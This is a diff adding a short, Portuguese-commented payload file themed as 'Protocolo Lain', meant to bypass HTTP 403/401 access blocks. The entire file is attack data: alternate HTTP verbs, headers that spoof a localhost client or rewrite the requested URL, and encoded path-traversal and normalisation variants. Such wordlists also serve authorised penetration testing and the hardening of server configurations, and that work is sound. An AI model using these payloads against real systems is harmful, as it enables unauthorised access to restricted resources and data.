@@ -1,0 +1,40 @@
+# --- NAVI OS: PROTOCOLO LAIN - MATRIZ DE BYPASS ---
+# Este ficheiro contém payloads para tentar contornar bloqueios 403/401 na Wired.
+
+[VERBS]
+POST
+HEAD
+OPTIONS
+PUT
+PATCH
+TRACE
+
+[HEADERS]
+X-Original-URL: /
+X-Rewrite-URL: /
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: ::1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Host: localhost
+X-Forwarded-Host: localhost
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+
+[PATHS]
+/%2e/
+/.;/
+/..;/
+/./
+//
+/./.
+/%20/
+/%09/
+/%00/
+/..%2f
+/..%5c
+/..%ff/
+/..%20/
